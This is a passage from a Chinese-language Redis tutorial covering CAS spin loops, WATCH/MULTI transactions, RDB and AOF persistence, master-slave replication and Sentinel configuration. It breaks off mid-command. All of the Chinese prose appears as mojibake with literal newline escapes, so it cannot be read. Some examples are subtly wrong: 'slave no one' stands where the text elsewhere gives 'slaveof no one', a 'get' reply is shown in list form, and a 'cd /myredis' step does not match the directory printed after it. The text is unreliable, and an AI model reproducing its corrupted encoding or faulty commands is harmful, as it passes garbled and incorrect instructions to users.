å†…å­˜å€¼ï¼Œåˆ™ä»£è¡¨ä¸­é—´æ²¡æœ‰è¢«äººä¿®æ”¹è¿‡ï¼Œæ­¤æ—¶å°±å°†æ–°å€¼å»æ›¿æ¢å†…å­˜å€¼ï¼Œå…¶ä¸­do while æ˜¯ä¸ºäº†åœ¨æ“ä½œå¤±è´¥æ—¶ï¼Œå†æ¬¡è¿›è¡Œè‡ªæ—‹æ“ä½œï¼Œå³æŠŠä¹‹å‰çš„é€»è¾‘å†æ“ä½œä¸€æ¬¡ã€‚\n\n```java\nint var5;\ndo {\n    var5 = this.getIntVolatile(var1, var2);\n} while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4));\n\nreturn var5;\n```\n\n### 3.3 watch & unwatch\n\nåœ¨æ‰§è¡Œ multi ä¹‹å‰ï¼Œå…ˆæ‰§è¡Œ watch key1 [key2]ï¼Œå¯ä»¥ç›‘è§†ä¸€ä¸ª(æˆ–å¤šä¸ª) key ï¼Œå¦‚æœåœ¨äº‹åŠ¡æ‰§è¡Œä¹‹å‰è¿™ä¸ª(æˆ–è¿™äº›) key è¢«å…¶ä»–å‘½ä»¤æ‰€æ”¹åŠ¨ï¼Œé‚£ä¹ˆäº‹åŠ¡å°†è¢«æ‰“æ–­ã€‚\n\n```bash\n127.0.0.1:6379[1]> watch balence\nOK\n127.0.0.1:6379[1]> multi\nOK\n127.0.0.1:6379[1](TX)> decrby balence 10\nQUEUED\n127.0.0.1:6379[1](TX)> incrby debt 10\nQUEUED\n127.0.0.1:6379[1](TX)> exec\n1) (integer) -10\n2) (integer) 10\n```\n\nunwatch å–æ¶ˆ WATCH å‘½ä»¤å¯¹æ‰€æœ‰ key çš„ç›‘è§†ã€‚å¦‚æœåœ¨æ‰§è¡Œ WATCH å‘½ä»¤ä¹‹åï¼ŒEXEC å‘½ä»¤æˆ–DISCARD å‘½ä»¤å…ˆè¢«æ‰§è¡Œäº†çš„è¯ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦å†æ‰§è¡Œ UNWATCH äº†ã€‚\n\n## 4.Redisäº‹åŠ¡ä¸‰ç‰¹æ€§\n\n- å•ç‹¬çš„éš”ç¦»æ“ä½œ\n  - äº‹åŠ¡ä¸­çš„æ‰€æœ‰å‘½ä»¤éƒ½ä¼šåºåˆ—åŒ–ã€æŒ‰é¡ºåºåœ°æ‰§è¡Œã€‚äº‹åŠ¡åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸ä¼šè¢«å…¶ä»–å®¢æˆ·ç«¯å‘é€æ¥çš„å‘½ä»¤è¯·æ±‚æ‰€æ‰“æ–­ã€‚ \n\n- æ²¡æœ‰éš”ç¦»çº§åˆ«çš„æ¦‚å¿µ\n  - é˜Ÿåˆ—ä¸­çš„å‘½ä»¤æ²¡æœ‰æäº¤ä¹‹å‰éƒ½ä¸ä¼šå®é™…è¢«æ‰§è¡Œï¼Œå› ä¸ºäº‹åŠ¡æäº¤å‰ä»»ä½•æŒ‡ä»¤éƒ½ä¸ä¼šè¢«å®é™…æ‰§è¡Œ\n\n- ä¸ä¿è¯åŸå­æ€§\n  - äº‹åŠ¡ä¸­å¦‚æœæœ‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œå…¶åçš„å‘½ä»¤ä»ç„¶ä¼šè¢«æ‰§è¡Œï¼Œæ²¡æœ‰å›æ»š \n\n# ä¸ƒã€æŒä¹…åŒ–\n\n## 1.RDB\n\n> RDB(Redis DataBase) åœ¨**æŒ‡å®šçš„æ—¶é—´é—´éš”å†…**å°†**å†…å­˜**ä¸­çš„æ•°æ®é›†å¿«ç…§å†™å…¥**ç£ç›˜**ï¼Œ ä¹Ÿå°±æ˜¯ Snapshot å¿«ç…§ï¼Œå®ƒæ¢å¤æ—¶æ˜¯å°†å¿«ç…§æ–‡ä»¶ç›´æ¥è¯»åˆ°å†…å­˜é‡Œ\n\n### **RDBæ‰§è¡Œæ­¥éª¤**\n\n![](https://img.jwt1399.top/img/202208312223339.png)\n\n- Redis ä¼šå•ç‹¬åˆ›å»ºï¼ˆforkï¼‰ä¸€ä¸ªå­è¿›ç¨‹æ¥è¿›è¡ŒæŒä¹…åŒ–\n  - Fork çš„ä½œç”¨æ˜¯å¤åˆ¶ä¸€ä¸ªä¸å½“å‰è¿›ç¨‹ä¸€æ ·çš„è¿›ç¨‹ã€‚æ–°è¿›ç¨‹çš„æ‰€æœ‰æ•°æ®ï¼ˆå˜é‡ã€ç¯å¢ƒå˜é‡ã€ç¨‹åºè®¡æ•°å™¨ç­‰ï¼‰ æ•°å€¼éƒ½å’ŒåŸè¿›ç¨‹ä¸€è‡´ï¼Œä½†æ˜¯æ˜¯ä¸€ä¸ªå…¨æ–°çš„è¿›ç¨‹ï¼Œå¹¶ä½œä¸ºåŸè¿›ç¨‹çš„å­è¿›ç¨‹\n  - åœ¨Linuxç¨‹åºä¸­ï¼Œfork()ä¼šäº§ç”Ÿä¸€ä¸ªå’Œçˆ¶è¿›ç¨‹å®Œå…¨ç›¸åŒçš„å­è¿›ç¨‹ï¼Œä½†å­è¿›ç¨‹åœ¨æ­¤åå¤šä¼šexecç³»ç»Ÿè°ƒç”¨ï¼Œå‡ºäºæ•ˆç‡è€ƒè™‘ï¼ŒLinuxä¸­å¼•å…¥äº†â€œ**å†™æ—¶å¤åˆ¶æŠ€æœ¯**â€\n  - **ä¸€èˆ¬æƒ…å†µçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¼šå…±ç”¨åŒä¸€æ®µç‰©ç†å†…å­˜**ï¼Œåªæœ‰è¿›ç¨‹ç©ºé—´çš„å„æ®µçš„å†…å®¹è¦å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ‰ä¼šå°†çˆ¶è¿›ç¨‹çš„å†…å®¹å¤åˆ¶ä¸€ä»½ç»™å­è¿›ç¨‹ã€‚\n\n- å…ˆå°†æ•°æ®å†™å…¥åˆ°ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ä¸­\n- å¾…æŒä¹…åŒ–è¿‡ç¨‹éƒ½ç»“æŸäº†ï¼Œå†ç”¨è¿™ä¸ªä¸´æ—¶æ–‡ä»¶æ›¿æ¢ä¸Šæ¬¡æŒä¹…åŒ–å¥½çš„æ–‡ä»¶(dump.rdb)\n  - åœ¨redis.confä¸­é…ç½®æŒä¹…åŒ–æ–‡ä»¶åç§°ï¼Œé»˜è®¤ä¸ºdump.rdb\n  - rdbæ–‡ä»¶çš„ä¿å­˜è·¯å¾„ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ã€‚é»˜è®¤ä¸ºRediså¯åŠ¨æ—¶å‘½ä»¤è¡Œæ‰€åœ¨çš„ç›®å½•ä¸‹\n\næ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸»è¿›ç¨‹æ˜¯ä¸è¿›è¡Œä»»ä½• IO æ“ä½œçš„ï¼Œè¿™å°±ç¡®ä¿äº†æé«˜çš„æ€§èƒ½ï¼Œ**RDBçš„ç¼ºç‚¹æ˜¯æœ€åä¸€æ¬¡æŒä¹…åŒ–åçš„æ•°æ®å¯èƒ½ä¸¢å¤±**ã€‚\n\n### **è§¦å‘RDBç­–ç•¥**\n\n**a>é…ç½®æ–‡ä»¶ä¸­é»˜è®¤çš„å¿«ç…§é…ç½®**\n\n![](https://img.jwt1399.top/img/202208312349936.png)\n\nå…¶ä¸­ `save 3600 1`çš„å«ä¹‰æ˜¯ï¼šæ¯ 3600 ç§’æ—¶ï¼Œè‡³å°‘æœ‰ 1 ä¸ª key å˜åŒ–ï¼Œåˆ™è§¦å‘RDBï¼›save 300 10å’Œsave 60 10000åŒç†ã€‚\n\n**b>é€šè¿‡ `save` æˆ–  `bgsave` å‘½ä»¤è§¦å‘RDBç­–ç•¥**\n\n```sql\n127.0.0.1:6379>save\n127.0.0.1:6379>bgsave\n\nå¯ä»¥é€šè¿‡lastsave å‘½ä»¤è·å–æœ€åä¸€æ¬¡æˆåŠŸæ‰§è¡Œå¿«ç…§çš„æ—¶é—´\n127.0.0.1:6379>lastsave\n```\n\n**save**\n\n- ä¼˜ç‚¹ï¼šèŠ‚çº¦ç³»ç»Ÿèµ„æº\n\n- ç¼ºç‚¹ï¼šç›´æ¥è°ƒç”¨ rdbSave ï¼Œé˜»å¡ Redis ä¸»è¿›ç¨‹ï¼Œç›´åˆ°ä¿å­˜å®Œæˆä¸ºæ­¢ã€‚åœ¨ä¸»è¿›ç¨‹é˜»å¡æœŸé—´ï¼ŒæœåŠ¡å™¨ä¸èƒ½å¤„ç†å®¢æˆ·ç«¯çš„ä»»ä½•è¯·æ±‚ã€‚\n\n**bgsave**\n\n- ä¼˜ç‚¹ï¼šfork å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹è´Ÿè´£è°ƒç”¨ rdbSave ï¼Œå¹¶åœ¨ä¿å­˜å®Œæˆä¹‹åå‘ä¸»è¿›ç¨‹å‘é€ä¿¡å·ï¼Œé€šçŸ¥ä¿å­˜å·²å®Œæˆã€‚ Redis æœåŠ¡å™¨åœ¨BGSAVE æ‰§è¡ŒæœŸé—´ä»ç„¶å¯ä»¥ç»§ç»­å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚\n\n- ç¼ºç‚¹ï¼šç”±äºä¼šforkä¸€ä¸ªè¿›ç¨‹ï¼Œå› æ­¤æ›´æ¶ˆè€—å†…å­˜\n\n### **ä¼˜ç¼ºç‚¹**\n\nä¼˜ç‚¹\n\n- é€‚åˆå¤§è§„æ¨¡çš„æ•°æ®æ¢å¤\n\n- å¯¹æ•°æ®å®Œæ•´æ€§å’Œä¸€è‡´æ€§è¦æ±‚ä¸é«˜æ›´é€‚åˆä½¿ç”¨\n\n- èŠ‚çœç£ç›˜ç©ºé—´\n\n- æ¢å¤é€Ÿåº¦å¿«\n\nç¼ºç‚¹\n\n- Forkçš„æ—¶å€™ï¼Œå†…å­˜ä¸­çš„æ•°æ®è¢«å…‹éš†äº†ä¸€ä»½ï¼Œå¤§è‡´2å€çš„è†¨èƒ€æ€§éœ€è¦è€ƒè™‘\n\n- è™½ç„¶Redisåœ¨forkæ—¶ä½¿ç”¨äº†**å†™æ—¶æ‹·è´æŠ€æœ¯**,ä½†æ˜¯å¦‚æœæ•°æ®åºå¤§æ—¶è¿˜æ˜¯æ¯”è¾ƒæ¶ˆè€—æ€§èƒ½ã€‚\n\n- åœ¨å¤‡ä»½å‘¨æœŸåœ¨ä¸€å®šé—´éš”æ—¶é—´åšä¸€æ¬¡å¤‡ä»½ï¼Œæ‰€ä»¥å¦‚æœRedisæ„å¤–downæ‰çš„è¯ï¼Œå°±ä¼šä¸¢å¤±æœ€åä¸€æ¬¡å¿«ç…§åçš„æ‰€æœ‰ä¿®æ”¹ã€‚\n\n## 2.AOF\n\n> AOF(Append Only File)ï¼šä»¥**æ—¥å¿—**çš„å½¢å¼æ¥è®°å½•æ¯ä¸ªå†™æ“ä½œï¼ˆå¢é‡ä¿å­˜ï¼‰ï¼Œå°†Redisæ‰§è¡Œè¿‡çš„æ‰€æœ‰å†™æŒ‡ä»¤è®°å½•ä¸‹æ¥(**è¯»æ“ä½œä¸è®°å½•**)ï¼Œ **åªè®¸è¿½åŠ æ–‡ä»¶ä½†ä¸å¯ä»¥æ”¹å†™æ–‡ä»¶**ï¼Œrediså¯åŠ¨ä¹‹åˆä¼šè¯»å–è¯¥æ–‡ä»¶é‡æ–°æ„å»ºæ•°æ®ï¼Œæ¢è¨€ä¹‹ï¼Œredis é‡å¯çš„è¯å°±æ ¹æ®æ—¥å¿—æ–‡ä»¶çš„å†…å®¹å°†å†™æŒ‡ä»¤ä»å‰åˆ°åæ‰§è¡Œä¸€æ¬¡ä»¥å®Œæˆæ•°æ®çš„æ¢å¤å·¥ä½œ\n\n### AOFæ‰§è¡Œæ­¥éª¤\n\n![](https://img.jwt1399.top/img/202208312340365.png)\n\n- å®¢æˆ·ç«¯çš„è¯·æ±‚å†™å‘½ä»¤ä¼šè¢«appendè¿½åŠ åˆ°AOFç¼“å†²åŒºå†…ï¼›\n\n- AOFç¼“å†²åŒºæ ¹æ®AOFæŒä¹…åŒ–ç­–ç•¥[always,everysec,no]å°†æ“ä½œsyncåŒæ­¥åˆ°ç£ç›˜çš„AOFæ–‡ä»¶ä¸­ï¼›\n  - appendfsync always å§‹ç»ˆåŒæ­¥ï¼Œæ¯æ¬¡Redisçš„å†™å…¥éƒ½ä¼šç«‹åˆ»è®°å…¥æ—¥å¿—ï¼›æ€§èƒ½è¾ƒå·®ä½†æ•°æ®å®Œæ•´æ€§æ¯”è¾ƒå¥½\n  - appendfsync everysec æ¯ç§’åŒæ­¥ï¼Œæ¯ç§’è®°å…¥æ—¥å¿—ä¸€æ¬¡ï¼Œå¦‚æœå®•æœºï¼Œæœ¬ç§’çš„æ•°æ®å¯èƒ½ä¸¢å¤±ã€‚\n  - appendfsync no  ä¸ä¸»åŠ¨è¿›è¡ŒåŒæ­¥ï¼ŒæŠŠåŒæ­¥æ—¶æœºäº¤ç»™æ“ä½œç³»ç»Ÿã€‚\n\n- AOFæ–‡ä»¶å¤§å°è¶…è¿‡é‡å†™ç­–ç•¥æˆ–æ‰‹åŠ¨é‡å†™æ—¶ï¼Œä¼šå¯¹AOFæ–‡ä»¶rewriteé‡å†™ï¼Œå‹ç¼©AOFæ–‡ä»¶å®¹é‡ï¼›\n- RedisæœåŠ¡é‡å¯æ—¶ï¼Œä¼šé‡æ–°loadåŠ è½½AOFæ–‡ä»¶ä¸­çš„å†™æ“ä½œè¾¾åˆ°æ•°æ®æ¢å¤çš„ç›®çš„ï¼›\n\n### è§¦å‘AOFç­–ç•¥\n\n- AOFé»˜è®¤ä¸å¼€å¯ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­è®¾ç½®å¼€å¯\n  - ä¿®æ”¹é»˜è®¤çš„appendonly noï¼Œæ”¹ä¸ºyes\n  - å¦‚é‡åˆ°AOFæ–‡ä»¶æŸåï¼Œé€šè¿‡ /usr/local/bin/redis-check-aof  --fix appendonly.aof è¿›è¡Œæ¢å¤\n\n- å¯ä»¥åœ¨redis.confä¸­é…ç½®æ–‡ä»¶åç§°ï¼Œé»˜è®¤ä¸º appendonly.aof\n\n- AOFæ–‡ä»¶çš„ä¿å­˜è·¯å¾„ï¼ŒåŒRDBçš„è·¯å¾„ä¸€è‡´ã€‚\n\n###  Rewriteå‹ç¼©\n\nAOFé‡‡ç”¨æ–‡ä»¶è¿½åŠ æ–¹å¼ï¼Œæ–‡ä»¶ä¼šè¶Šæ¥è¶Šå¤§ä¸ºé¿å…å‡ºç°æ­¤ç§æƒ…å†µï¼Œæ–°å¢äº†é‡å†™æœºåˆ¶, å½“AOFæ–‡ä»¶çš„å¤§å°è¶…è¿‡æ‰€è®¾å®šçš„é˜ˆå€¼æ—¶ï¼ŒRediså°±ä¼šå¯åŠ¨AOFæ–‡ä»¶çš„å†…å®¹å‹ç¼©ï¼Œ åªä¿ç•™å¯ä»¥æ¢å¤æ•°æ®çš„æœ€å°æŒ‡ä»¤é›†.å¯ä»¥ä½¿ç”¨å‘½ä»¤bgrewriteaof\n\n### ä¼˜ç¼ºç‚¹\n\nä¼˜ç‚¹\n\n- å¤‡ä»½æœºåˆ¶æ›´ç¨³å¥ï¼Œä¸¢å¤±æ•°æ®æ¦‚ç‡æ›´ä½ã€‚\n\n- å¯è¯»çš„æ—¥å¿—æ–‡æœ¬ï¼Œé€šè¿‡æ“ä½œAOFç¨³å¥ï¼Œå¯ä»¥å¤„ç†è¯¯æ“ä½œã€‚\n\nç¼ºç‚¹\n\n- æ¯”èµ·RDBå ç”¨æ›´å¤šçš„ç£ç›˜ç©ºé—´ã€‚\n\n- æ¢å¤å¤‡ä»½é€Ÿåº¦è¦æ…¢ã€‚\n\n- æ¯æ¬¡è¯»å†™éƒ½åŒæ­¥çš„è¯ï¼Œæœ‰ä¸€å®šçš„æ€§èƒ½å‹åŠ›ã€‚\n\n- å­˜åœ¨ä¸ªåˆ«Bugï¼Œé€ æˆæ¢å¤ä¸èƒ½ã€‚\n\n## 3.æ€»ç»“\n\n**AOFå’ŒRDBåŒæ—¶å¼€å¯ï¼Œrediså¬è°çš„ï¼Ÿ**\n\nAOFå’ŒRDBåŒæ—¶å¼€å¯ï¼Œç³»ç»Ÿé»˜è®¤å–AOFçš„æ•°æ®ï¼ˆæ•°æ®ä¸ä¼šå­˜åœ¨ä¸¢å¤±ï¼‰\n\n**AOFå’ŒRDBç”¨å“ªä¸ªå¥½ï¼Ÿ**\n\nå®˜æ–¹æ¨èä¸¤ä¸ªéƒ½å¯ç”¨ã€‚\n\nå¦‚æœéœ€è¦è¿›è¡Œå¤§è§„æ¨¡æ•°æ®çš„æ¢å¤ï¼Œä¸”å¯¹äºæ•°æ®æ¢å¤çš„å®Œæ•´æ€§ä¸æ˜¯éå¸¸æ•æ„Ÿï¼Œé‚£ RDB æ–¹å¼è¦æ¯”AOFæ–¹å¼æ›´åŠ çš„é«˜æ•ˆã€‚ä¸å»ºè®®å•ç‹¬ç”¨ AOFï¼Œå› ä¸ºå¯èƒ½ä¼šå‡ºç°Bugã€‚å¦‚æœåªæ˜¯åšçº¯å†…å­˜ç¼“å­˜ï¼Œå¯ä»¥éƒ½ä¸ç”¨ã€‚\n\n# å…«ã€ä¸»ä»å¤åˆ¶\n\n## 1.ç®€ä»‹\n\nä¸»æœº(master)æ•°æ®æ›´æ–°åæ ¹æ®é…ç½®å’Œç­–ç•¥ï¼Œ è‡ªåŠ¨åŒæ­¥åˆ°å¤‡/ä»æœº(slaver)çš„æœºåˆ¶ï¼ŒMaster ä»¥å†™ä¸ºä¸»ï¼ŒSlaver ä»¥è¯»ä¸ºä¸»\n\n![](https://img.jwt1399.top/img/202209011443833.png)\n\n- å¯å®ç°è¯»å†™åˆ†ç¦»ï¼Œæ€§èƒ½æ‰©å±•\n\n- å¯å®ç°å®¹ç¾å¿«é€Ÿæ¢å¤\n\n**ä¸»ä»å¤åˆ¶åŸç†**\n\n- 1ã€å½“ä»è¿æ¥ä¸Šä¸»æœåŠ¡å™¨ä¹‹åï¼Œä»æœåŠ¡å™¨å‘ä¸»æœåŠ¡å™¨å‘é€æ•°æ®åŒæ­¥æ¶ˆæ¯ï¼›\n\n- 2ã€ä¸»æœåŠ¡å™¨æ¥åˆ°ä»æœåŠ¡å™¨å‘é€è¿‡æ¥åŒæ­¥æ¶ˆæ¯ï¼ŒæŠŠä¸»æœåŠ¡å™¨æ•°æ®æŒä¹…åŒ–ä¸º rdb æ–‡ä»¶ï¼ŒæŠŠ rdb æ–‡ä»¶å‘é€ç»™ä»æœåŠ¡å™¨ï¼Œä»æœåŠ¡å™¨æ‹¿åˆ° rdb è¿›è¡Œè¯»å–ï¼›ï¼ˆå…¨é‡å¤åˆ¶ï¼‰\n\n  - å…¨é‡å¤åˆ¶ï¼šè€ŒslaveæœåŠ¡åœ¨æ¥æ”¶åˆ°æ•°æ®åº“æ–‡ä»¶æ•°æ®åï¼Œå°†å…¶å­˜ç›˜å¹¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚\n\n- 3ã€ä¹‹åæ¯æ¬¡ä¸»æœåŠ¡å™¨è¿›è¡Œå†™æ“ä½œä¹‹åï¼Œå’Œä»æœåŠ¡å™¨è¿›è¡Œæ•°æ®åŒæ­¥ï¼ˆå¢é‡å¤åˆ¶ï¼‰ï¼ˆå³ç¬¬ä¸€æ¬¡éœ€è¦ä»æœåŠ¡å™¨è¯·æ±‚ï¼Œä¹‹åæ¯æ¬¡ä¸»æœåŠ¡å™¨ä¸»åŠ¨åŒæ­¥ï¼‰\n\n  - å¢é‡å¤åˆ¶ï¼šMasterç»§ç»­å°†æ–°çš„æ‰€æœ‰æ”¶é›†åˆ°çš„ä¿®æ”¹å‘½ä»¤ä¾æ¬¡ä¼ ç»™slave,å®ŒæˆåŒæ­¥\n\n  - ä»æœºæŒ‚æ‰ï¼Œé‡æ–°è¿æ¥ä¸»æœºï¼Œè‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡å…¨é‡å¤åˆ¶\n\n## 2.æ¨¡æ‹Ÿä¸€ä¸»äºŒä»†\n\n![](https://img.jwt1399.top/img/202209011629975.png)\n\n> æ¨¡æ‹Ÿä¸‰å° redis æœåŠ¡å™¨ï¼ˆ6379ã€6380ã€6381ï¼‰ï¼Œä¸»æœºï¼ˆ6379ï¼‰ä»æœºï¼ˆ6380ã€6381ï¼‰\n>\n> æˆ‘çš„ redis é…ç½®æ–‡ä»¶è·¯å¾„ï¼š /opt/homebrew/etc/redis.conf\n\n- 1.æ–°å»ºæ–‡ä»¶å¤¹ myredis\n\n```bash\n$ pwd\n/Users/jianjian\n$ mkdir myredis\n$ cd  /myredis\n$ pwd\n/Users/jianjian/myredis\n```\n\n- 2.å¤åˆ¶ redis.conf é…ç½®æ–‡ä»¶åˆ°è¯¥æ–‡ä»¶å¤¹\n\n```bash\n$ cp /opt/homebrew/etc/redis.conf  ~/myredis/redis.conf\n```\n\n- 3.é…ç½®ä¸€ä¸»ä¸¤ä»ï¼Œåˆ›å»ºä¸‰ä¸ªé…ç½®æ–‡ä»¶\n\n```bash\n$ vi redis6379.conf\n\ninclude /Users/jianjian/myredis/redis.conf\npidfile /var/run/redis_6379.pid\nport 6379\ndbfilename dump6379.rdb\n\n$ vi redis6380.conf\n\ninclude /Users/jianjian/myredis/redis.conf\npidfile /var/run/redis_6380.pid\nport 6380\ndbfilename dump6380.rdb\n\n$ vi redis6381.conf\n\ninclude /Users/jianjian/myredis/redis.conf\npidfile /var/run/redis_6381.pid\nport 6381\ndbfilename dump6381.rdb\n```\n\n- 4.å¯åŠ¨ä¸‰å°redisæœåŠ¡å™¨\n\n```bash\n$ redis-server redis6379.conf\n$ redis-server redis6380.conf\n$ redis-server redis6381.conf\n```\n\n- 5.æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹ï¼Œçœ‹çœ‹ä¸‰å°æœåŠ¡å™¨æ˜¯å¦å¯åŠ¨\n\n```bash\n$ ps -ef | grep redis\n\n501 85018 80912   0  3:54PM ttys000    0:00.60 redis-server 127.0.0.1:6380\n501 86115 85019   0  3:56PM ttys001    0:00.49 redis-server 127.0.0.1:6379\n501 86631 86116   0  3:57PM ttys002    0:00.35 redis-server 127.0.0.1:6381\n```\n\n- 6.æŸ¥çœ‹ä¸‰å°ä¸»æœºè¿è¡Œæƒ…å†µ\n\n```bash\n$ redis-cli -p 6379\n127.0.0.1:6379> info replication\n\n# Replication\nrole:master\nconnected_slaves:0\n......\n```\n\n```bash\n$ redis-cli -p 6380\n127.0.0.1:6380> info replication\n\n# Replication\nrole:master\nconnected_slaves:0\n......\n```\n\n```bash\n$ redis-cli -p 6381\n127.0.0.1:6381> info replication\n\n# Replication\nrole:master\nconnected_slaves:0\n......\n```\n\n- 7.é…ç½®ä»æœº\n  - `slaveof <ip><port>` æˆä¸ºæŸä¸ªå®ä¾‹çš„ä»æœåŠ¡å™¨\n\n```bash\n# åœ¨6380å’Œ6381ä¸Šæ‰§è¡Œ: slaveof 127.0.0.1 6379\n\n#å˜ä¸ºä»æœº\n$ redis-cli -p 6380\n127.0.0.1:6380>slaveof 127.0.0.1 6379\n127.0.0.1:6380> info replication\n# Replication\nrole:slave\nmaster_host:127.0.0.1\nmaster_port:6379\n......\n\n#å˜ä¸ºä»æœº\n$ redis-cli -p 6381\n127.0.0.1:6381>slaveof 127.0.0.1 6379\n127.0.0.1:6381> info replication\n# Replication\nrole:slave\nmaster_host:127.0.0.1\nmaster_port:6379\n```\n\n- 8ã€åœ¨ä¸»æœºä¸Šå†™ï¼Œåœ¨ä»æœºä¸Šå¯ä»¥è¯»å–æ•°æ®\n\n```bash\n# ä¸»æœºå†™å…¥æ•°æ®\n$ redis-cli -p 6379\n127.0.0.1:6379> set k1 v1\n127.0.0.1:6379> keys *\n1) \"k1\"\n```\n\n```bash\n# ä»æœºå¯ä»¥è¯»å–æ•°æ®\n$ redis-cli -p 6380\n127.0.0.1:6380> keys *\n1) \"k1\"\n```\n\n```bash\n# ä»æœºå¯ä»¥è¯»å–æ•°æ®\n$ redis-cli -p 6381\n127.0.0.1:6381> get k1\n1) \"v1\"\n```\n\n**æ³¨**ï¼šå¦‚æœä¸»æœºæŒ‚æ‰ï¼Œé‡å¯å°±è¡Œï¼Œä¸€åˆ‡å¦‚åˆã€‚ä»æœºé‡å¯éœ€é‡è®¾ï¼šslaveof 127.0.0.1 6379 \n\nå¯ä»¥å°†é…ç½®å¢åŠ åˆ°æ–‡ä»¶ä¸­ã€‚æ°¸ä¹…ç”Ÿæ•ˆã€‚\n\n**Q&A**\n\n**slave1ã€slave2æ˜¯ä»å¤´å¼€å§‹å¤åˆ¶è¿˜æ˜¯ä»åˆ‡å…¥ç‚¹å¼€å§‹å¤åˆ¶?æ¯”å¦‚ä»k4è¿›æ¥ï¼Œé‚£ä¹‹å‰çš„k1,k2,k3æ˜¯å¦ä¹Ÿå¯ä»¥å¤åˆ¶ï¼Ÿ**\n\nä»å¤´å¼€å§‹å¤åˆ¶ï¼›å¯ä»¥\n\n**ä»æœºæ˜¯å¦å¯ä»¥å†™ï¼Ÿsetå¯å¦ï¼Ÿ** \n\nä¸å¯ä»¥\n\n**ä¸»æœºshutdownåæƒ…å†µå¦‚ä½•ï¼Ÿä»æœºæ˜¯ä¸Šä½è¿˜æ˜¯åŸåœ°å¾…å‘½ï¼Ÿ**\n\nä¸»æœºæŒ‚æ‰ï¼Œä»æœºåŸåœ°å¾…å‘½\n\n**ä¸»æœºåˆå›æ¥äº†åï¼Œä¸»æœºæ–°å¢è®°å½•ï¼Œä»æœºè¿˜èƒ½å¦é¡ºåˆ©å¤åˆ¶ï¼Ÿ** \n\nå¯ä»¥\n\n**å…¶ä¸­ä¸€å°ä»æœºdownåæƒ…å†µå¦‚ä½•ï¼Ÿä¾ç…§åŸæœ‰å®ƒèƒ½è·Ÿä¸Šå¤§éƒ¨é˜Ÿå—ï¼Ÿ**\n\nä»æœºæŒ‚æ‰é‡å¯åéœ€è¦é‡è®¾ï¼šslaveof 127.0.0.1 6379 \n\n## 3.è–ªç«ç›¸ä¼ \n\nä¸Šä¸€ä¸ª Slave å¯ä»¥æ˜¯ä¸‹ä¸€ä¸ª slave çš„Masterï¼Œslave åŒæ ·å¯ä»¥æ¥æ”¶å…¶ä»– slave çš„è¿æ¥å’ŒåŒæ­¥è¯·æ±‚ï¼Œé‚£ä¹ˆè¯¥ slave ä½œä¸ºäº†é“¾æ¡ä¸­ä¸‹ä¸€ä¸ªçš„ masterï¼Œå¯ä»¥æœ‰æ•ˆå‡è½» master çš„å†™å‹åŠ›ï¼Œå»ä¸­å¿ƒåŒ–é™ä½é£é™©ã€‚\n\n![](https://img.jwt1399.top/img/202209011637640.png)\n\n```bash\n$ redis-cli -p 6380\n127.0.0.1:6380>slaveof 127.0.0.1 6379\n\n$ redis-cli -p 6381\n127.0.0.1:6381>slaveof 127.0.0.1 6380\n```\n\n## 4.åå®¢ä¸ºä¸»\n\n> å³ ä¸»æœºæŒ‚æ‰ä¹‹åï¼Œå¤‡æœºä¸Šä½æˆä¸ºä¸»æœºï¼Œä¿è¯æœåŠ¡æ­£å¸¸è¿›è¡Œ\n\nå½“ä¸€ä¸ª master å®•æœºåï¼Œåé¢çš„ slave å¯ä»¥ç«‹åˆ»å‡ä¸º masterï¼Œå…¶åé¢çš„ slave ä¸ç”¨åšä»»ä½•ä¿®æ”¹ã€‚ç”¨ `slaveof no one`  å°†ä»æœºå˜ä¸ºä¸»æœºã€‚\n\n```bash\n# master å®•æœº\n$ redis-cli -p 6379\n127.0.0.1:6379> shutdown\n```\n\n```bash\n# slave1å‡ä¸ºmaster\n$ redis-cli -p 6380\n127.0.0.1:6380> slave no one\n127.0.0.1:6380> set k2 v2\n```\n\n```bash\n$ redis-cli -p 6381\n127.0.0.1:6381> get k2\n\"v2\"\n```\n\n## 5.å“¨å…µæ¨¡å¼\n\n**åå®¢ä¸ºä¸»çš„è‡ªåŠ¨ç‰ˆ**ï¼Œèƒ½å¤Ÿåå°ç›‘æ§ä¸»æœºæ˜¯å¦æ•…éšœï¼Œå¦‚æœæ•…éšœäº†æ ¹æ®æŠ•ç¥¨æ•°è‡ªåŠ¨å°†ä»æœºè½¬æ¢ä¸ºä¸»æœº\n\n![](https://img.jwt1399.top/img/202209011737377.png)\n\n**é…ç½®å“¨å…µ**\n\n- æ–°å»º sentinel.conf æ–‡ä»¶ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹\n\n```bash\n$ vi sentinel.conf\n\nsentinel monitor mymaster 127.0.0.1 6379 1\n```\n\nå…¶ä¸­ mymaster ä¸ºç›‘æ§å¯¹è±¡èµ·çš„æœåŠ¡å™¨åç§°ï¼Œ 1 ä¸ºè‡³å°‘æœ‰å¤šå°‘ä¸ªå“¨å…µåŒæ„è¿ç§»çš„æ•°é‡ã€‚ \n\n**å¯åŠ¨å“¨å…µ**\n\n```bash\n$ redis-sentinel sentinel.conf \n```\n\n![](https://img.jwt1399.top/img/202209011811442.png)\n\n**å½“ä¸»æœºæŒ‚æ‰ï¼Œä»æœºé€‰ä¸¾ä¸­äº§ç”Ÿæ–°çš„ä¸»æœº**\n\n```bash\n$ 127.0.0.1:6379> 